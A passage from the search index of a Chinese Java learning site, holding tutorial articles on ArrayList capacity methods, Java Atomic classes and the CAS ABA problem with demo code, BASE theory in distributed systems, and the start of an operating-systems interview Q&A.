返回的数组的运行时类型是指定数组的运行时类型。 */ public Object[] toArray() { //elementData：要复制的数组；size：要复制的长度  return Arrays.copyOf(elementData, size); } 个人觉得使用 Arrays.copyOf()方法主要是为了给原有数组扩容，测试代码如下：\npublic class ArrayscopyOfTest { public static void main(String[] args) { int[] a = new int[3]; a[0] = 0; a[1] = 1; a[2] = 2; int[] b = Arrays.copyOf(a, 10); System.out.println(\u0026#34;b.length\u0026#34;+b.length); } } 结果：\n10 3.3.3. 两者联系和区别    联系：\n看两者源代码可以发现 copyOf()内部实际调用了 System.arraycopy() 方法\n区别：\narraycopy() 需要目标数组，将原数组拷贝到你自己定义的数组里或者原数组，而且可以选择拷贝的起点和长度以及放入新数组中的位置 copyOf() 是系统自动在内部新建一个数组，并返回该数组。\n3.4. ensureCapacity方法    ArrayList 源码中有一个 ensureCapacity 方法不知道大家注意到没有，这个方法 ArrayList 内部没有被调用过，所以很显然是提供给用户调用的，那么这个方法有什么作用呢？\n/** 如有必要，增加此 ArrayList 实例的容量，以确保它至少可以容纳由minimum capacity参数指定的元素数。 * * @param minCapacity 所需的最小容量 */ public void ensureCapacity(int minCapacity) { int minExpand = (elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) // any size if not default element table  ? 0 // larger than default for default empty table. It\u0026#39;s already  // supposed to be at default size.  : DEFAULT_CAPACITY; if (minCapacity \u0026gt; minExpand) { ensureExplicitCapacity(minCapacity); } } 最好在 add 大量元素之前用 ensureCapacity 方法，以减少增量重新分配的次数\n我们通过下面的代码实际测试以下这个方法的效果：\npublic class EnsureCapacityTest { public static void main(String[] args) { ArrayList\u0026lt;Object\u0026gt; list = new ArrayList\u0026lt;Object\u0026gt;(); final int N = 10000000; long startTime = System.currentTimeMillis(); for (int i = 0; i \u0026lt; N; i++) { list.add(i); } long endTime = System.currentTimeMillis(); System.out.println(\u0026#34;使用ensureCapacity方法前：\u0026#34;+(endTime - startTime)); } } 运行结果：\n使用ensureCapacity方法前：2158 public class EnsureCapacityTest { public static void main(String[] args) { ArrayList\u0026lt;Object\u0026gt; list = new ArrayList\u0026lt;Object\u0026gt;(); final int N = 10000000; list = new ArrayList\u0026lt;Object\u0026gt;(); long startTime1 = System.currentTimeMillis(); list.ensureCapacity(N); for (int i = 0; i \u0026lt; N; i++) { list.add(i); } long endTime1 = System.currentTimeMillis(); System.out.println(\u0026#34;使用ensureCapacity方法后：\u0026#34;+(endTime1 - startTime1)); } } 运行结果：\n使用ensureCapacity方法后：1773 通过运行结果，我们可以看出向 ArrayList 添加大量元素之前最好先使用ensureCapacity 方法，以减少增量重新分配的次数。\n"},{"id":133,"href":"/java/multi-thread/Atomic%E5%8E%9F%E5%AD%90%E7%B1%BB%E6%80%BB%E7%BB%93/","title":"Atomic原子类总结","parent":"multi-thread","content":"点击关注公众号及时获取笔主最新更新文章，并可免费领取本文档配套的《Java面试突击》以及Java工程师必备学习资源。\n 个人觉得这一节掌握基本的使用即可！\n  1 Atomic 原子类介绍 2 基本类型原子类  2.1 基本类型原子类介绍 2.2 AtomicInteger 常见方法使用 2.3 基本数据类型原子类的优势 2.4 AtomicInteger 线程安全原理简单分析   3 数组类型原子类  3.1 数组类型原子类介绍 3.2 AtomicIntegerArray 常见方法使用   4 引用类型原子类  4.1 引用类型原子类介绍 4.2 AtomicReference 类使用示例 4.3 AtomicStampedReference 类使用示例 4.4 AtomicMarkableReference 类使用示例   5 对象的属性修改类型原子类  5.1 对象的属性修改类型原子类介绍 5.2 AtomicIntegerFieldUpdater 类使用示例    1 Atomic 原子类介绍    Atomic 翻译成中文是原子的意思。在化学上，我们知道原子是构成一般物质的最小单位，在化学反应中是不可分割的。在我们这里 Atomic 是指一个操作是不可中断的。即使是在多个线程一起执行的时候，一个操作一旦开始，就不会被其他线程干扰。\n所以，所谓原子类说简单点就是具有原子/原子操作特征的类。\n并发包 java.util.concurrent 的原子类都存放在java.util.concurrent.atomic下,如下图所示。\n根据操作的数据类型，可以将JUC包中的原子类分为4类\n基本类型\n使用原子的方式更新基本类型\n AtomicInteger：整型原子类 AtomicLong：长整型原子类 AtomicBoolean ：布尔型原子类  数组类型\n使用原子的方式更新数组里的某个元素\n AtomicIntegerArray：整型数组原子类 AtomicLongArray：长整型数组原子类 AtomicReferenceArray ：引用类型数组原子类  引用类型\n AtomicReference：引用类型原子类 AtomicMarkableReference：原子更新带有标记的引用类型。该类将 boolean 标记与引用关联起来，也可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。 AtomicStampedReference ：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。  对象的属性修改类型\n AtomicIntegerFieldUpdater:原子更新整型字段的更新器 AtomicLongFieldUpdater：原子更新长整型字段的更新器 AtomicReferenceFieldUpdater：原子更新引用类型里的字段   🐛 修正（参见：issue#626） : AtomicMarkableReference 不能解决ABA问题。\n /** AtomicMarkableReference是将一个boolean值作是否有更改的标记，本质就是它的版本号只有两个，true和false， 修改的时候在这两个版本号之间来回切换，这样做并不能解决ABA的问题，只是会降低ABA问题发生的几率而已 @author : mazh @Date : 2020/1/17 14:41 */ public class SolveABAByAtomicMarkableReference { private static AtomicMarkableReference atomicMarkableReference = new AtomicMarkableReference(100, false); public static void main(String[] args) { Thread refT1 = new Thread(() -\u0026gt; { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } atomicMarkableReference.compareAndSet(100, 101, atomicMarkableReference.isMarked(), !atomicMarkableReference.isMarked()); atomicMarkableReference.compareAndSet(101, 100, atomicMarkableReference.isMarked(), !atomicMarkableReference.isMarked()); }); Thread refT2 = new Thread(() -\u0026gt; { boolean marked = atomicMarkableReference.isMarked(); try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean c3 = atomicMarkableReference.compareAndSet(100, 101, marked, !marked); System.out.println(c3); // 返回true,实际应该返回false  }); refT1.start(); refT2.start(); } } CAS ABA 问题\n 描述: 第一个线程取到了变量 x 的值 A，然后巴拉巴拉干别的事，总之就是只拿到了变量 x 的值 A。这段时间内第二个线程也取到了变量 x 的值 A，然后把变量 x 的值改为 B，然后巴拉巴拉干别的事，最后又把变量 x 的值变为 A （相当于还原了）。在这之后第一个线程终于进行了变量 x 的操作，但是此时变量 x 的值还是 A，所以 compareAndSet 操作是成功。 例子描述(可能不太合适，但好理解): 年初，现金为零，然后通过正常劳动赚了三百万，之后正常消费了（比如买房子）三百万。年末，虽然现金零收入（可能变成其他形式了），但是赚了钱是事实，还是得交税的！ 代码例子（以AtomicInteger为例）  import java.util.concurrent.atomic.AtomicInteger; public class AtomicIntegerDefectDemo { public static void main(String[] args) { defectOfABA(); } static void defectOfABA() { final AtomicInteger atomicInteger = new AtomicInteger(1); Thread coreThread = new Thread( () -\u0026gt; { final int currentValue = atomicInteger.get(); System.out.println(Thread.currentThread().getName() + \u0026#34; ------ currentValue=\u0026#34; + currentValue); // 这段目的：模拟处理其他业务花费的时间  try { Thread.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } boolean casResult = atomicInteger.compareAndSet(1, 2); System.out.println(Thread.currentThread().getName() + \u0026#34; ------ currentValue=\u0026#34; + currentValue + \u0026#34;, finalValue=\u0026#34; + atomicInteger.get() + \u0026#34;, compareAndSet Result=\u0026#34; + casResult); } ); coreThread.start(); // 这段目的：为了让 coreThread 线程先跑起来  try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } Thread amateurThread = new Thread( () -\u0026gt; { int currentValue = atomicInteger.get(); boolean casResult = atomicInteger.compareAndSet(1, 2); System.out.println(Thread.currentThread().getName() + \u0026#34; ------ currentValue=\u0026#34; + currentValue + \u0026#34;, finalValue=\u0026#34; + atomicInteger.get() + \u0026#34;, compareAndSet Result=\u0026#34; + casResult); currentValue = atomicInteger.get(); casResult = atomicInteger.compareAndSet(2, 1); System.out.println(Thread.currentThread().getName() + \u0026#34; ------ currentValue=\u0026#34; + currentValue + \u0026#34;, finalValue=\u0026#34; + atomicInteger.get() + \u0026#34;, compareAndSet Result=\u0026#34; + casResult); } ); amateurThread.start(); } } 输出内容如下：\nThread-0 ------ currentValue=1 Thread-1 ------ currentValue=1, finalValue=2, compareAndSet Result=true Thread-1 ------ currentValue=2, finalValue=1, compareAndSet Result=true Thread-0 ------ currentValue=1, finalValue=2, compareAndSet Result=true 下面我们来详细介绍一下这些原子类。\n2 基本类型原子类    2.1 基本类型原子类介绍    使用原子的方式更新基本类型\n AtomicInteger：整型原子类 AtomicLong：长整型原子类 AtomicBoolean ：布尔型原子类  上面三个类提供的方法几乎相同，所以我们这里以 AtomicInteger 为例子来介绍。\nAtomicInteger 类常用方法\npublic final int get() //获取当前的值 public final int getAndSet(int newValue)//获取当前的值，并设置新的值 public final int getAndIncrement()//获取当前的值，并自增 public final int getAndDecrement() //获取当前的值，并自减 public final int getAndAdd(int delta) //获取当前的值，并加上预期的值 boolean compareAndSet(int expect, int update) //如果输入的数值等于预期值，则以原子方式将该值设置为输入值（update） public final void lazySet(int newValue)//最终设置为newValue,使用 lazySet 设置之后可能导致其他线程在之后的一小段时间内还是可以读到旧的值。 2.2 AtomicInteger 常见方法使用    import java.util.concurrent.atomic.AtomicInteger; public class AtomicIntegerTest { public static void main(String[] args) { // TODO Auto-generated method stub \tint temvalue = 0; AtomicInteger i = new AtomicInteger(0); temvalue = i.getAndSet(3); System.out.println(\u0026#34;temvalue:\u0026#34; + temvalue + \u0026#34;; i:\u0026#34; + i);//temvalue:0; i:3 \ttemvalue = i.getAndIncrement(); System.out.println(\u0026#34;temvalue:\u0026#34; + temvalue + \u0026#34;; i:\u0026#34; + i);//temvalue:3; i:4 \ttemvalue = i.getAndAdd(5); System.out.println(\u0026#34;temvalue:\u0026#34; + temvalue + \u0026#34;; i:\u0026#34; + i);//temvalue:4; i:9 \t} } 2.3 基本数据类型原子类的优势    通过一个简单例子带大家看一下基本数据类型原子类的优势\n①多线程环境不使用原子类保证线程安全（基本数据类型）\nclass Test { private volatile int count = 0; //若要线程安全执行执行count++，需要加锁  public synchronized void increment() { count++; } public int getCount() { return count; } } ②多线程环境使用原子类保证线程安全（基本数据类型）\nclass Test2 { private AtomicInteger count = new AtomicInteger(); public void increment() { count.incrementAndGet(); } //使用AtomicInteger之后，不需要加锁，也可以实现线程安全。  public int getCount() { return count.get(); } } 2.4 AtomicInteger 线程安全原理简单分析    AtomicInteger 类的部分源码：\n// setup to use Unsafe.compareAndSwapInt for updates（更新操作时提供“比较并替换”的作用）  private static final Unsafe unsafe = Unsafe.getUnsafe(); private static final long valueOffset; static { try { valueOffset = unsafe.objectFieldOffset (AtomicInteger.class.getDeclaredField(\u0026#34;value\u0026#34;)); } catch (Exception ex) { throw new Error(ex); } } private volatile int value; AtomicInteger 类主要利用 CAS (compare and swap) + volatile 和 native 方法来保证原子操作，从而避免 synchronized 的高开销，执行效率大为提升。\nCAS的原理是拿期望的值和原本的一个值作比较，如果相同则更新成新的值。UnSafe 类的 objectFieldOffset() 方法是一个本地方法，这个方法是用来拿到“原来的值”的内存地址。另外 value 是一个volatile变量，在内存中可见，因此 JVM 可以保证任何时刻任何线程总能拿到该变量的最新值。\n3 数组类型原子类    3.1 数组类型原子类介绍    使用原子的方式更新数组里的某个元素\n AtomicIntegerArray：整形数组原子类 AtomicLongArray：长整形数组原子类 AtomicReferenceArray ：引用类型数组原子类  上面三个类提供的方法几乎相同，所以我们这里以 AtomicIntegerArray 为例子来介绍。\nAtomicIntegerArray 类常用方法\npublic final int get(int i) //获取 index=i 位置元素的值 public final int getAndSet(int i, int newValue)//返回 index=i 位置的当前的值，并将其设置为新值：newValue public final int getAndIncrement(int i)//获取 index=i 位置元素的值，并让该位置的元素自增 public final int getAndDecrement(int i) //获取 index=i 位置元素的值，并让该位置的元素自减 public final int getAndAdd(int i, int delta) //获取 index=i 位置元素的值，并加上预期的值 boolean compareAndSet(int i, int expect, int update) //如果输入的数值等于预期值，则以原子方式将 index=i 位置的元素值设置为输入值（update） public final void lazySet(int i, int newValue)//最终 将index=i 位置的元素设置为newValue,使用 lazySet 设置之后可能导致其他线程在之后的一小段时间内还是可以读到旧的值。 3.2 AtomicIntegerArray 常见方法使用    import java.util.concurrent.atomic.AtomicIntegerArray; public class AtomicIntegerArrayTest { public static void main(String[] args) { // TODO Auto-generated method stub \tint temvalue = 0; int[] nums = { 1, 2, 3, 4, 5, 6 }; AtomicIntegerArray i = new AtomicIntegerArray(nums); for (int j = 0; j \u0026lt; nums.length; j++) { System.out.println(i.get(j)); } temvalue = i.getAndSet(0, 2); System.out.println(\u0026#34;temvalue:\u0026#34; + temvalue + \u0026#34;; i:\u0026#34; + i); temvalue = i.getAndIncrement(0); System.out.println(\u0026#34;temvalue:\u0026#34; + temvalue + \u0026#34;; i:\u0026#34; + i); temvalue = i.getAndAdd(0, 5); System.out.println(\u0026#34;temvalue:\u0026#34; + temvalue + \u0026#34;; i:\u0026#34; + i); } } 4 引用类型原子类    4.1 引用类型原子类介绍    基本类型原子类只能更新一个变量，如果需要原子更新多个变量，需要使用 引用类型原子类。\n AtomicReference：引用类型原子类 AtomicStampedReference：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。 AtomicMarkableReference ：原子更新带有标记的引用类型。该类将 boolean 标记与引用关联起来，也可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。  上面三个类提供的方法几乎相同，所以我们这里以 AtomicReference 为例子来介绍。\n4.2 AtomicReference 类使用示例    import java.util.concurrent.atomic.AtomicReference; public class AtomicReferenceTest { public static void main(String[] args) { AtomicReference\u0026lt;Person\u0026gt; ar = new AtomicReference\u0026lt;Person\u0026gt;(); Person person = new Person(\u0026#34;SnailClimb\u0026#34;, 22); ar.set(person); Person updatePerson = new Person(\u0026#34;Daisy\u0026#34;, 20); ar.compareAndSet(person, updatePerson); System.out.println(ar.get().getName()); System.out.println(ar.get().getAge()); } } class Person { private String name; private int age; public Person(String name, int age) { super(); this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 上述代码首先创建了一个 Person 对象，然后把 Person 对象设置进 AtomicReference 对象中，然后调用 compareAndSet 方法，该方法就是通过 CAS 操作设置 ar。如果 ar 的值为 person 的话，则将其设置为 updatePerson。实现原理与 AtomicInteger 类中的 compareAndSet 方法相同。运行上面的代码后的输出结果如下：\nDaisy 20 4.3 AtomicStampedReference 类使用示例    import java.util.concurrent.atomic.AtomicStampedReference; public class AtomicStampedReferenceDemo { public static void main(String[] args) { // 实例化、取当前值和 stamp 值  final Integer initialRef = 0, initialStamp = 0; final AtomicStampedReference\u0026lt;Integer\u0026gt; asr = new AtomicStampedReference\u0026lt;\u0026gt;(initialRef, initialStamp); System.out.println(\u0026#34;currentValue=\u0026#34; + asr.getReference() + \u0026#34;, currentStamp=\u0026#34; + asr.getStamp()); // compare and set  final Integer newReference = 666, newStamp = 999; final boolean casResult = asr.compareAndSet(initialRef, newReference, initialStamp, newStamp); System.out.println(\u0026#34;currentValue=\u0026#34; + asr.getReference() + \u0026#34;, currentStamp=\u0026#34; + asr.getStamp() + \u0026#34;, casResult=\u0026#34; + casResult); // 获取当前的值和当前的 stamp 值  int[] arr = new int[1]; final Integer currentValue = asr.get(arr); final int currentStamp = arr[0]; System.out.println(\u0026#34;currentValue=\u0026#34; + currentValue + \u0026#34;, currentStamp=\u0026#34; + currentStamp); // 单独设置 stamp 值  final boolean attemptStampResult = asr.attemptStamp(newReference, 88); System.out.println(\u0026#34;currentValue=\u0026#34; + asr.getReference() + \u0026#34;, currentStamp=\u0026#34; + asr.getStamp() + \u0026#34;, attemptStampResult=\u0026#34; + attemptStampResult); // 重新设置当前值和 stamp 值  asr.set(initialRef, initialStamp); System.out.println(\u0026#34;currentValue=\u0026#34; + asr.getReference() + \u0026#34;, currentStamp=\u0026#34; + asr.getStamp()); // [不推荐使用，除非搞清楚注释的意思了] weak compare and set  // 困惑！weakCompareAndSet 这个方法最终还是调用 compareAndSet 方法。[版本: jdk-8u191]  // 但是注释上写着 \u0026#34;May fail spuriously and does not provide ordering guarantees,  // so is only rarely an appropriate alternative to compareAndSet.\u0026#34;  // todo 感觉有可能是 jvm 通过方法名在 native 方法里面做了转发  final boolean wCasResult = asr.weakCompareAndSet(initialRef, newReference, initialStamp, newStamp); System.out.println(\u0026#34;currentValue=\u0026#34; + asr.getReference() + \u0026#34;, currentStamp=\u0026#34; + asr.getStamp() + \u0026#34;, wCasResult=\u0026#34; + wCasResult); } } 输出结果如下：\ncurrentValue=0, currentStamp=0 currentValue=666, currentStamp=999, casResult=true currentValue=666, currentStamp=999 currentValue=666, currentStamp=88, attemptStampResult=true currentValue=0, currentStamp=0 currentValue=666, currentStamp=999, wCasResult=true 4.4 AtomicMarkableReference 类使用示例    import java.util.concurrent.atomic.AtomicMarkableReference; public class AtomicMarkableReferenceDemo { public static void main(String[] args) { // 实例化、取当前值和 mark 值  final Boolean initialRef = null, initialMark = false; final AtomicMarkableReference\u0026lt;Boolean\u0026gt; amr = new AtomicMarkableReference\u0026lt;\u0026gt;(initialRef, initialMark); System.out.println(\u0026#34;currentValue=\u0026#34; + amr.getReference() + \u0026#34;, currentMark=\u0026#34; + amr.isMarked()); // compare and set  final Boolean newReference1 = true, newMark1 = true; final boolean casResult = amr.compareAndSet(initialRef, newReference1, initialMark, newMark1); System.out.println(\u0026#34;currentValue=\u0026#34; + amr.getReference() + \u0026#34;, currentMark=\u0026#34; + amr.isMarked() + \u0026#34;, casResult=\u0026#34; + casResult); // 获取当前的值和当前的 mark 值  boolean[] arr = new boolean[1]; final Boolean currentValue = amr.get(arr); final boolean currentMark = arr[0]; System.out.println(\u0026#34;currentValue=\u0026#34; + currentValue + \u0026#34;, currentMark=\u0026#34; + currentMark); // 单独设置 mark 值  final boolean attemptMarkResult = amr.attemptMark(newReference1, false); System.out.println(\u0026#34;currentValue=\u0026#34; + amr.getReference() + \u0026#34;, currentMark=\u0026#34; + amr.isMarked() + \u0026#34;, attemptMarkResult=\u0026#34; + attemptMarkResult); // 重新设置当前值和 mark 值  amr.set(initialRef, initialMark); System.out.println(\u0026#34;currentValue=\u0026#34; + amr.getReference() + \u0026#34;, currentMark=\u0026#34; + amr.isMarked()); // [不推荐使用，除非搞清楚注释的意思了] weak compare and set  // 困惑！weakCompareAndSet 这个方法最终还是调用 compareAndSet 方法。[版本: jdk-8u191]  // 但是注释上写着 \u0026#34;May fail spuriously and does not provide ordering guarantees,  // so is only rarely an appropriate alternative to compareAndSet.\u0026#34;  // todo 感觉有可能是 jvm 通过方法名在 native 方法里面做了转发  final boolean wCasResult = amr.weakCompareAndSet(initialRef, newReference1, initialMark, newMark1); System.out.println(\u0026#34;currentValue=\u0026#34; + amr.getReference() + \u0026#34;, currentMark=\u0026#34; + amr.isMarked() + \u0026#34;, wCasResult=\u0026#34; + wCasResult); } } 输出结果如下：\ncurrentValue=null, currentMark=false currentValue=true, currentMark=true, casResult=true currentValue=true, currentMark=true currentValue=true, currentMark=false, attemptMarkResult=true currentValue=null, currentMark=false currentValue=true, currentMark=true, wCasResult=true 5 对象的属性修改类型原子类    5.1 对象的属性修改类型原子类介绍    如果需要原子更新某个类里的某个字段时，需要用到对象的属性修改类型原子类。\n AtomicIntegerFieldUpdater:原子更新整形字段的更新器 AtomicLongFieldUpdater：原子更新长整形字段的更新器 AtomicReferenceFieldUpdater ：原子更新引用类型里的字段的更新器  要想原子地更新对象的属性需要两步。第一步，因为对象的属性修改类型原子类都是抽象类，所以每次使用都必须使用静态方法 newUpdater()创建一个更新器，并且需要设置想要更新的类和属性。第二步，更新的对象属性必须使用 public volatile 修饰符。\n上面三个类提供的方法几乎相同，所以我们这里以 AtomicIntegerFieldUpdater为例子来介绍。\n5.2 AtomicIntegerFieldUpdater 类使用示例    import java.util.concurrent.atomic.AtomicIntegerFieldUpdater; public class AtomicIntegerFieldUpdaterTest { public static void main(String[] args) { AtomicIntegerFieldUpdater\u0026lt;User\u0026gt; a = AtomicIntegerFieldUpdater.newUpdater(User.class, \u0026#34;age\u0026#34;); User user = new User(\u0026#34;Java\u0026#34;, 22); System.out.println(a.getAndIncrement(user));// 22 \tSystem.out.println(a.get(user));// 23 \t} } class User { private String name; public volatile int age; public User(String name, int age) { super(); this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } 输出结果：\n22 23 Reference     《Java并发编程的艺术》  公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java面试突击》: 由本文档衍生的专为面试而生的《Java面试突击》V2.0 PDF 版本公众号后台回复 \u0026ldquo;面试突击\u0026rdquo; 即可免费领取！\nJava工程师必备学习资源: 一些Java工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":134,"href":"/system-design/distributed-system/BASE%E7%90%86%E8%AE%BA/","title":"BASE理论","parent":"distributed-system","content":"BASE 理论    BASE 理论起源于 2008 年， 由eBay的架构师Dan Pritchett在ACM上发表。\n简介    BASE 是 Basically Available（基本可用） 、Soft-state（软状态） 和 Eventually Consistent（最终一致性） 三个短语的缩写。BASE 理论是对 CAP 中一致性 C 和可用性 A 权衡的结果，其来源于对大规模互联网系统分布式实践的总结，是基于 CAP 定理逐步演化而来的，它大大降低了我们对系统的要求。\nBASE 理论的核心思想    即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。\n 也就是牺牲数据的一致性来满足系统的高可用性，系统中一部分数据不可用或者不一致时，仍需要保持系统整体“主要可用”。\n BASE 理论本质上是对 CAP 的延伸和补充，更具体地说，是对 CAP 中 AP 方案的一个补充。\n为什么这样说呢？\nCAP 理论这节我们也说过了：\n 如果系统没有发生“分区”的话，节点间的网络连接通信正常的话，也就不存在 P 了。这个时候，我们就可以同时保证 C 和 A 了。因此，如果系统发生“分区”，我们要考虑选择 CP 还是 AP。如果系统没有发生“分区”的话，我们要思考如何保证 CA 。\n 因此，AP 方案只是在系统发生分区的时候放弃一致性，而不是永远放弃一致性。在分区故障恢复后，系统应该达到最终一致性。这一点其实就是 BASE 理论延伸的地方。\nBASE 理论三要素    1. 基本可用    基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性。但是，这绝不等价于系统不可用。\n什么叫允许损失部分可用性呢？\n 响应时间上的损失: 正常情况下，处理用户请求需要 0.5s 返回结果，但是由于系统出现故障，处理用户请求的时间变为 3 s。 系统功能上的损失：正常情况下，用户可以使用系统的全部功能，但是由于系统访问量突然剧增，系统的部分非核心功能无法使用。  2. 软状态    软状态指允许系统中的数据存在中间状态（CAP 理论中的数据不一致），并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时。\n3. 最终一致性    最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性。\n 分布式一致性的 3 种级别：\n  强一致性 ：系统写入了什么，读出来的就是什么。\n  弱一致性 ：不一定可以读取到最新写入的值，也不保证多少时间之后读取到的数据是最新的，只是会尽量保证某个时刻达到数据一致的状态。\n  最终一致性 ：弱一致性的升级版，系统会保证在一定时间内达到数据一致的状态。\n  业界比较推崇是最终一致性级别，但是某些对数据一致要求十分严格的场景比如银行转账还是要保证强一致性。\n 那实现最终一致性的具体方式是什么呢? 《分布式协议与算法实战》 中是这样介绍：\n  读时修复 : 在读取数据时，检测数据的不一致，进行修复。比如 Cassandra 的 Read Repair 实现，具体来说，在向 Cassandra 系统查询数据的时候，如果检测到不同节点 的副本数据不一致，系统就自动修复数据。 写时修复 : 在写入数据，检测数据的不一致时，进行修复。比如 Cassandra 的 Hinted Handoff 实现。具体来说，Cassandra 集群的节点之间远程写数据的时候，如果写失败 就将数据缓存下来，然后定时重传，修复数据的不一致性。 异步修复 : 这个是最常用的方式，通过定时对账检测副本数据的一致性，并修复。   比较推荐 写时修复，这种方式对性能消耗比较低。\n总结    ACID 是数据库事务完整性的理论，CAP 是分布式系统设计理论，BASE 是 CAP 理论中 AP 方案的延伸。\n"},{"id":135,"href":"/cs-basics/operating-system/basis/","title":"basis","parent":"operating-system","content":"大家好，我是 Guide 哥！\n很多读者抱怨计算操作系统的知识点比较繁杂，自己也没有多少耐心去看，但是面试的时候又经常会遇到。所以，我带着我整理好的操作系统的常见问题来啦！这篇文章总结了一些我觉得比较重要的操作系统相关的问题比如进程管理、内存管理、虚拟内存等等。\n文章形式通过大部分比较喜欢的面试官和求职者之间的对话形式展开。另外，Guide哥 也只是在大学的时候学习过操作系统，不过基本都忘了，为了写这篇文章这段时间看了很多相关的书籍和博客。如果文中有任何需要补充和完善的地方，你都可以在 issue 中指出！\n这篇文章只是对一些操作系统比较重要概念的一个概览，深入学习的话，建议大家还是老老实实地去看书。另外， 这篇文章的很多内容参考了《现代操作系统》第三版这本书，非常感谢。\n开始本文的内容之前，我们先聊聊为什么要学习操作系统。\n 从对个人能力方面提升来说 ：操作系统中的很多思想、很多经典的算法，你都可以在我们日常开发使用的各种工具或者框架中找到它们的影子。比如说我们开发的系统使用的缓存（比如 Redis）和操作系统的高速缓存就很像。CPU 中的高速缓存有很多种，不过大部分都是为了解决 CPU 处理速度和内存处理速度不对等的问题。我们还可以把内存看作外存的高速缓存，程序运行的时候我们把外存的数据复制到内存，由于内存的处理速度远远高于外存，这样提高了处理速度。同样地，我们使用的 Redis 缓存就是为了解决程序处理速度和访问常规关系型数据库速度不对等的问题。高速缓存一般会按照局部性原理（2-8 原则）根据相应的淘汰算法保证缓存中的数据是经常会被访问的。我们平常使用的 Redis 缓存很多时候也会按照 2-8 原则去做，很多淘汰算法都和操作系统中的类似。既说了 2-8 原则，那就不得不提命中率了，这是所有缓存概念都通用的。简单来说也就是你要访问的数据有多少能直接在缓存中直接找到。命中率高的话，一般表明你的缓存设计比较合理，系统处理速度也相对较快。 从面试角度来说 ：尤其是校招，对于操作系统方面知识的考察是非常非常多的。  简单来说，学习操作系统能够提高自己思考的深度以及对技术的理解力，并且，操作系统方面的知识也是面试必备。\n关于如何学习操作系统，可以看这篇回答：https://www.zhihu.com/question/270998611/answer/1640198217。\n一 操作系统基础    面试官顶着蓬松的假发向我走来，只见他一手拿着厚重的 Thinkpad ，一手提着他那淡黄的长裙。\n\n1.1 什么是操作系统？    👨‍💻面试官 ： 先来个简单问题吧！什么是操作系统？\n🙋 我 ：我通过以下四点向您介绍一下什么是操作系统吧！\n 操作系统（Operating System，简称 OS）是管理计算机硬件与软件资源的程序，是计算机的基石。 操作系统本质上是一个运行在计算机上的软件程序 ，用于管理计算机硬件和软件资源。 举例：运行在你电脑上的所有应用程序都通过操作系统来调用系统内存以及磁盘等等硬件。 操作系统存在屏蔽了硬件层的复杂性。 操作系统就像是硬件使用的负责人，统筹着各种相关事项。 操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。 内核是连接应用程序和硬件的桥梁，决定着系统的性能和稳定性。  1.2 系统调用    👨‍💻面试官 ：什么是系统调用呢？ 能不能详细介绍一下。\n🙋 我 ：介绍系统调用之前，我们先来了解一下用户态和系统态。\n根据进程访问资源的特点，我们可以把进程在系统上的运行分为两个级别：\n 用户态(user mode) : 用户态运行的进程可以直接读取用户程序的数据。 系统态(kernel mode):可以简单的理解系统态运行的进程或程序几乎可以访问计算机的任何资源，不受限制。  说了用户态和系统态之后，那么什么是系统调用呢？\n我们运行的程序基本都是运行在用户态，如果我们调用操作系统提供的系统态级别的子功能咋办呢？那就需要系统调用了！\n也就是说在我们运行的用户程序中，凡是与系统态级别的资源有关的操作（如文件管理、进程控制、内存管理等)，都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。\n这些系统调用按功能大致可分为如下几类：\n 设备管理。完成设备的请求或释放，以及设备启动等功能。 文件管理。完成文件的读、写、创建及删除等功能。 进程控制。完成进程的创建、撤销、阻塞及唤醒等功能。 进程通信。完成进程之间的消息传递或信号传递等功能。 内存管理。完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。  二 进程和线程    2.1 进程和线程的区别    👨‍💻面试官: 好的！我明白了！那你再说一下： 进程和线程的区别。\n🙋 我： 好的！ 下图是 Java 内存区域，我们从 JVM 的角度来说一下线程和进程之间的关系吧！\n 如果你对 Java 内存区域 (运行时数据区) 这部分知识不太了解的话可以阅读一下这篇文章：《可能是把 Java 内存区域讲的最清楚的一篇文章》\n 从上图可以看出：一个进程中可以有多个线程，多个线程共享进程的堆和方法区 (JDK1.8 之后的元空间)资源，但是每个线程有自己的程序计数器、虚拟机栈 和 本地方法栈。\n总结： 线程是进程划分成的更小的运行单位,一个进程在其执行的过程中可以产生多个线程。线程和进程最大的不同在于基本上各进程是独立的，而各线程则不一定，因为同一进程中的线程极有可能会相互影响。线程执行开销小，但不利于资源的管理和保护；而进程正相反。\n2.2 进程有哪几种状态?    👨‍💻面试官 ： 那你再说说进程有哪几种状态?\n🙋 我 ：我们一般把进程大致分为 5 种状态，这一点和线程很像！\n 创建状态(new) ：进程正在被创建，尚未到就绪状态。 就绪状态(ready) ：进程已处于准备运行状态，即进程获得了除了处理器之外的一切所需资源，一旦得到处理器资源(处理器分配的时间片)即可运行。 运行状态(running) ：进程正在处理器上上运行(单核 CPU 下任意时刻只有一个进程处于运行状态)。 阻塞状态(waiting) 